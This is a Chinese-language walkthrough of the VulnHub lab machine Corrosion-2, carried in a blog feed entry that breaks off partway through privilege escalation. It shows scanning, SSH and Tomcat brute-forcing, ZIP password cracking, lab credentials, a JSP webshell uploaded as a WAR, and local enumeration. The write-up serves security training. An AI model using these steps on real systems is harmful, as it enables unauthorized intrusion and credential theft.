    <link href="/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/corrosion-2/"/>
    <url>/2023/05/29/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/corrosion-2/</url>
    
    <content type="html"><![CDATA[<h1 id="Corrosion-2"><a href="#Corrosion-2" class="headerlink" title="Corrosion-2"></a>Corrosion-2</h1><p>靶机地址：<a href="https://www.vulnhub.com/entry/corrosion-2,745/">https://www.vulnhub.com/entry/corrosion-2,745/</a></p><p>难度：Medium 中等</p><p>提示：Enumeration is key. 枚举是关键.</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# arp-scan -l             <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:99:90:c7, IPv4: 192.168.222.128<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.222.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.222.2   00:50:56:ec:db:c2       VMware, Inc.<br>192.168.222.145 00:0c:29:89:60:a5       VMware, Inc.<br>192.168.222.254 00:50:56:f7:0d:b2       VMware, Inc.<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.10.0: 256 hosts scanned in 2.304 seconds (111.11 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# nmap -p- -A 192.168.222.145     <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 21:34 EDT<br>Nmap scan report for localhost (192.168.222.145)<br>Host is up (0.00062s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 6ad8446080397ef02d082fe58363f070 (RSA)<br>|   256 f2a662d7e76a94be7b6ba512692efed7 (ECDSA)<br>|_  256 28e10d048019be44a64873aae86a6544 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>8080/tcp open  http    Apache Tomcat 9.0.53<br>|_http-title: Apache Tomcat/9.0.53<br>|_http-favicon: Apache Tomcat<br>MAC Address: 00:0C:29:89:60:A5 (VMware)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.62 ms localhost (192.168.222.145)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 14.37 seconds                                                                      <br></code></pre></td></tr></table></figure><p>开放服务：</p><ul><li>20 SSH   暴力破解</li><li>80 Web  目录扫描，前端信息</li><li>8080 Tomcat 弱口令爆破，目录扫描</li></ul><p>规划：先把爆破的服务都跑上，再进行 Web 服务的目录扫描、前端信息测试。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><blockquote><p>80 端口 Web </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─# gobuster dir -u http://192.168.222.145/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.222.145/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/04/29 21:37:53 Starting gobuster in directory enumeration mode<br>===============================================================<br>/server-status        (Status: 403) [Size: 280]<br>Progress: 219693 / 220561 (99.61%)<br>===============================================================<br>2023/04/29 21:40:15 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>目录扫描没有信息，前端也没有提升信息，尝试扫文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# gobuster dir -u http://192.168.222.145/8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -b 400-500 -x html,txt,xml,php,rar,zip,7z,tar.gz,bak,git,svn <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.222.145/8080<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   420,429,479,484,489,450,458,461,464,404,407,447,409,410,418,427,433,430,448,468,469,476,491,400,432,463,467,490,402,426,431,451,454,493,412,437,456,457,466,477,486,498,500,434,441,462,478,481,403,405,411,422,428,438,455,483,401,414,415,416,443,449,472,495,421,423,425,442,444,459,480,474,419,436,439,440,445,453,471,487,488,496,417,435,446,465,485,499,406,408,413,473,475,497,424,452,460,470,482,492,494<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              html,xml,7z,git,svn,txt,php,rar,zip,tar.gz,bak<br>[+] Timeout:                 10s<br>===============================================================<br>2023/04/29 22:31:06 Starting gobuster in directory enumeration mode<br>===============================================================<br>Progress: 2646628 / 2646732 (100.00%)<br>===============================================================<br>2023/04/29 23:06:41 Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>啥都没有 …</p><blockquote><p>8080 端口 Tomcat </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─# gobuster dir -u http://192.168.222.145:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -b 400-500 -x txt,xml,php,rar,zip,7z,tar.gz,bak,git,svn     <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.222.145:8080<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   447,432,448,489,493,459,464,474,492,495,473,500,418,423,430,440,445,469,466,480,402,408,420,436,452,454,481,487,421,422,451,465,467,477,488,407,431,444,446,458,470,439,442,404,424,426,427,433,438,456,463,476,479,499,401,411,429,437,460,486,471,472,409,410,412,413,425,428,491,497,415,449,453,462,490,496,434,450,468,483,484,494,482,403,406,435,457,475,478,405,419,455,400,441,443,414,416,417,461,485,498<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              xml,git,svn,txt,php,rar,zip,7z,tar.gz,bak<br>[+] Timeout:                 10s<br>===============================================================<br>2023/04/29 22:29:26 Starting gobuster in directory enumeration mode<br>===============================================================<br>/docs                 (Status: 302) [Size: 0] [--&gt; /docs/]<br>/examples             (Status: 302) [Size: 0] [--&gt; /examples/]<br>/backup.zip           (Status: 200) [Size: 33723]<br>/readme.txt           (Status: 200) [Size: 153]<br>/manager              (Status: 302) [Size: 0] [--&gt; /manager/]<br>Progress: 507594 / 2426171 (20.92%)^C<br>[!] Keyboard interrupt detected, terminating.<br><br>===============================================================<br>2023/04/29 22:41:42 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p><a href="http://192.168.222.145:8080/readme.txt">http://192.168.222.145:8080/readme.txt</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230430104300814.png" alt="image-20230430104300814"></p><p><a href="http://192.168.222.145:8080/backup.zip">http://192.168.222.145:8080/backup.zip</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─# wget http://192.168.222.145:8080/backup.zip    <br>--2023-04-29 22:44:24--  http://192.168.222.145:8080/backup.zip<br>Connecting to 192.168.222.145:8080... connected.<br>HTTP request sent, awaiting response... 200 <br>Length: 33723 (33K) [application/zip]<br>Saving to: ‘backup.zip’<br><br>backup.zip                              100%[===============================================================================&gt;]  32.93K  --.-KB/s    in 0s      <br><br>2023-04-29 22:44:24 (194 MB/s) - ‘backup.zip’ saved [33723/33723]<br><br>                                                                                                                                                                <br>┌──(root㉿kali)-[/usr/share/wordlists]<br>└─# unzip backup.zip <br>Archive:  backup.zip<br>[backup.zip] catalina.policy password: <br>   skipping: catalina.policy         incorrect password<br>   skipping: context.xml             incorrect password<br>   skipping: catalina.properties     incorrect password<br>   skipping: jaspic-providers.xml    incorrect password<br>   skipping: jaspic-providers.xsd    incorrect password<br>   skipping: logging.properties      incorrect password<br>   skipping: server.xml              incorrect password<br>   skipping: tomcat-users.xml        incorrect password<br>   skipping: tomcat-users.xsd        incorrect password<br>   skipping: web.xml                 incorrect password<br></code></pre></td></tr></table></figure><p>解压需要密码，需要爆破。</p><h3 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h3><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h3><p>通过靶机的登录页面，可以获取到 3 个用户名：tomcat、jaye、randy</p><p>使用 rockyou.txt 大密码字典对其爆破：</p><p>时间可能比较久，放后台跑就行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# nohup hydra -L /usr/share/wordlists/username_corrosion.txt -P /usr/share/wordlists/rockyou.txt -V -e nsr -o ssh.txt 192.168.222.145 ssh &amp;<br>[1] 21666                                       <br>nohup: ignoring input and appending output to &#x27;nohup.out&#x27;<br></code></pre></td></tr></table></figure><p>太久了，停了。</p><h3 id="Tomcat爆破"><a href="#Tomcat爆破" class="headerlink" title="Tomcat爆破"></a>Tomcat爆破</h3><p>Tomcat 爆破可以使用 MSF 的爆破模块，依旧使用 rockyou.txt 大密码字典对其爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; search tomcat login<br>msf6 &gt; use auxiliary/scanner/http/tomcat_mgr_login<br>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; show options <br>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set rhosts 192.168.222.145<br>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set pass_file /usr/share/wordlists/rockyou.txt<br>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; run<br></code></pre></td></tr></table></figure><p>这里还没跑完，ZIP密码爆破就得到了 Tomcat 的账号密码，停了。</p><h3 id="ZIP密码爆破"><a href="#ZIP密码爆破" class="headerlink" title="ZIP密码爆破"></a>ZIP密码爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip<br>PASSWORD FOUND!!!!: pw == @administrator_hi5<br></code></pre></td></tr></table></figure><p>得到ZIP密码，解压查看文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/usr/share/wordlists]<br>└─# unzip -P &quot;@administrator_hi5&quot; backup.zip <br>Archive:  backup.zip<br>  inflating: catalina.policy         <br>  inflating: context.xml             <br>  inflating: catalina.properties     <br>  inflating: jaspic-providers.xml    <br>  inflating: jaspic-providers.xsd    <br>  inflating: logging.properties      <br>  inflating: server.xml              <br>  inflating: tomcat-users.xml        <br>  inflating: tomcat-users.xsd        <br>  inflating: web.xml                 <br>                                                                                                                                                             <br>┌──(root㉿kali)-[/usr/share/wordlists]<br>└─# cat tomcat-users.xml                     <br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;role rolename=&quot;manager-gui&quot;/&gt;<br>&lt;user username=&quot;manager&quot; password=&quot;melehifokivai&quot; roles=&quot;manager-gui&quot;/&gt;<br>&lt;role rolename=&quot;admin-gui&quot;/&gt;<br>&lt;user username=&quot;admin&quot; password=&quot;melehifokivai&quot; roles=&quot;admin-gui, manager-gui&quot;/&gt;<br>&lt;/tomcat-users&gt;<br></code></pre></td></tr></table></figure><p>获取了 2 个账号密码：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">manager melehifokivai</span><br><span class="hljs-attribute">admin melehifokivai</span><br></code></pre></td></tr></table></figure><p>尝试登录 Tomcat 后台，登录成功，可以上传 WAR：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230430105426167.png" alt="image-20230430105426167"></p><h3 id="Tomcat上传war包getshell"><a href="#Tomcat上传war包getshell" class="headerlink" title="Tomcat上传war包getshell"></a>Tomcat上传war包getshell</h3><blockquote><p>Tomcat 上传 war 包 getshell 不要使用 shell.war 作为文件名，上传后好像无法访问 shell.jsp</p></blockquote><p>哥斯拉生成一个 jsp 的后门，将 test.jsp 压缩为 test.zip，修改 zip 后缀为 war。</p><p>上传 war ，上传成功后出现 test 路径：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230430110927971.png" alt="image-20230430110927971"></p><p><a href="http://192.168.222.145:8080/test/test.jsp">http://192.168.222.145:8080/test/test.jsp</a> </p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230430111001206.png" alt="image-20230430111001206"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><blockquote><p>tomcat 用户</p></blockquote><p>哥斯拉的 Shell 卡，反弹 shell 到 KALI 里面玩。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">tomcat@corrosion:/home$ ls -l<br>ls -l<br>total 8<br>drwxr-x--x 18 jaye  jaye  4096 Sep 17  2021 jaye<br>dr-xr-xr-x 15 randy randy 4096 Sep 20  2021 randy# 有权限读取 randy 的家目录<br><br>tomcat@corrosion:/home$ cd randy<br>cd randy<br><br>tomcat@corrosion:/home/randy$ ls -l<br>ls -l<br>total 44<br>drwxr-xr-x 2 randy randy 4096 Sep 16  2021 Desktop<br>drwxr-xr-x 2 randy randy 4096 Sep 16  2021 Documents<br>drwxr-xr-x 2 randy randy 4096 Sep 16  2021 Downloads<br>drwxr-xr-x 2 randy randy 4096 Sep 16  2021 Music<br>-rw-r--r-- 1 root  root   283 Sep 20  2021 note.txt<br>drwxr-xr-x 2 randy randy 4096 Sep 16  2021 Pictures<br>drwxr-xr-x 2 randy randy 4096 Sep 16  2021 Public<br>-rwxr-xr-x 1 root  root   210 Sep 20  2021 randombase64.py# root 用户的 Py 脚本，可以读取，但不能修改<br>drwxr-xr-x 2 randy randy 4096 Sep 16  2021 Templates<br>-rw-rw-r-- 1 randy randy   33 Sep 17  2021 user.txt# flay<br>drwxr-xr-x 2 randy randy 4096 Sep 16  2021 Videos<br></code></pre></td></tr></table></figure><p>randy 家目录信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">tomcat@corrosion:/home/randy$ cat note.txt<br>cat note.txt<br>Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know<br>that I changed your permissions for your home directory. You won&#x27;t be able to remove or add files for now.<br><br>I will change these permissions later on.<br><br>See you next Monday randy!<br><br>tomcat@corrosion:/home/randy$ cat user.txt<br>cat user.txt<br>ca73a018ae6908a7d0ea5d1c269ba4b6<br><br>tomcat@corrosion:/home/randy$ cat randombase64.py<br><br>import base64<br><br>message = input(&quot;Enter your string: &quot;)<br>message_bytes = message.encode(&#x27;ascii&#x27;)<br>base64_bytes = base64.b64encode(message_bytes)<br>base64_message = base64_bytes.decode(&#x27;ascii&#x27;)<br><br>print(base64_message)<br></code></pre></td></tr></table></figure><p>SUID 文件查找，但没有可利用的程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell">tomcat@corrosion:/tmp$ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; &gt; suid_tomcat.txt<br>tomcat@corrosion:/tmp$ cat suid_tomcat.txt<br>cat suid_tomcat.txt<br>-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2128/bin/mount<br>-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2128/bin/ping<br>-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2128/bin/su<br>-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2128/bin/umount<br>-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2128/usr/bin/chfn<br>-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2128/usr/bin/chsh<br>-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2128/usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2128/usr/bin/newgrp<br>-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2128/usr/bin/passwd<br>-rwsr-xr-x 1 root root 149080 Jan 19  2021 /snap/core18/2128/usr/bin/sudo<br>-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 43088 Sep 16  2020 /snap/core18/2721/bin/mount<br>-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2721/bin/ping<br>-rwsr-xr-x 1 root root 44664 Nov 29 05:25 /snap/core18/2721/bin/su<br>-rwsr-xr-x 1 root root 26696 Sep 16  2020 /snap/core18/2721/bin/umount<br>-rwsr-xr-x 1 root root 76496 Nov 29 05:25 /snap/core18/2721/usr/bin/chfn<br>-rwsr-xr-x 1 root root 44528 Nov 29 05:25 /snap/core18/2721/usr/bin/chsh<br>-rwsr-xr-x 1 root root 75824 Nov 29 05:25 /snap/core18/2721/usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 40344 Nov 29 05:25 /snap/core18/2721/usr/bin/newgrp<br>-rwsr-xr-x 1 root root 59640 Nov 29 05:25 /snap/core18/2721/usr/bin/passwd<br>-rwsr-xr-x 1 root root 149080 Jan 16 07:40 /snap/core18/2721/usr/bin/sudo<br>-rwsr-xr-- 1 root systemd-resolve 42992 Oct 25  2022 /snap/core18/2721/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 436552 Mar 30  2022 /snap/core18/2721/usr/lib/openssh/ssh-keysign<br>-rwsr-xr-x 1 root root 131832 Mar 29 03:47 /snap/snapd/18933/usr/lib/snapd/snap-confine<br>-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo<br>-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount<br>-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su<br>-rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd<br>-rwsr-xr-x 1 root root 53040 Jul 14  2021 /usr/bin/chsh<br>-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount<br>-rwsr-xr-x 1 root root 85064 Jul 14  2021 /usr/bin/chfn<br>-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp<br>-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount<br>-rwsr-xr-x 1 root root 88464 Jul 14  2021 /usr/bin/gpasswd<br>-rwsr-xr-x 1 root root 14728 Mar 17  2021 /usr/bin/vmware-user-suid-wrapper<br>-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec<br>-rwsr-xr-- 1 root dip 395144 Jul 23  2020 /usr/sbin/pppd<br>-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device<br>-rwsr-xr-x 1 root root 473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign<br>-rwsr-sr-x 1 root root 14488 Jul  6  2021 /usr/lib/xorg/Xorg.wrap<br>-rwsr-xr-x 1 root root 130408 Mar 26  2021 /usr/lib/snapd/snap-confine<br>-rwsr-xr-x 1 root root 22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><p>sudo 权限查看，没有：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">tomcat@corrosion:/tmp$ sudo -l<br>sudo -l<br>[sudo] password for tomcat: melehifokivai<br><br>Sorry, try again.<br>[sudo] password for tomcat: ^C<br></code></pre></td></tr></table></figure><p>Capabilities 功能程序，没有：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tomcat@corrosion:/tmp$ getcap -r / 2&gt;/dev/null<br>getcap -r / 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>history 也没有：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">tomcat<span class="hljs-variable">@corrosion</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>history<br></code></pre></td></tr></table></figure><p>靶机常见的提权点都没用，剩下的就是内核溢出漏洞或者切换成其他用户。</p><p>先尝试切换用户，randy 用户失败了 ，jaye 切换成功了，密码就是上面获取到的 tomcat 后台密码，看了下这个密码在 rockyou.txt 里面，只不过上面的 SSH 爆破太久了，给关掉了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">tomcat@corrosion:/tmp$ su jaye<br>su jaye<br>Password: melehifokivai<br>python3 -c&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>jaye@corrosion:/tmp$ <br></code></pre></td></tr></table></figure><h4 id="jaye"><a href="#jaye" class="headerlink" title="jaye"></a>jaye</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 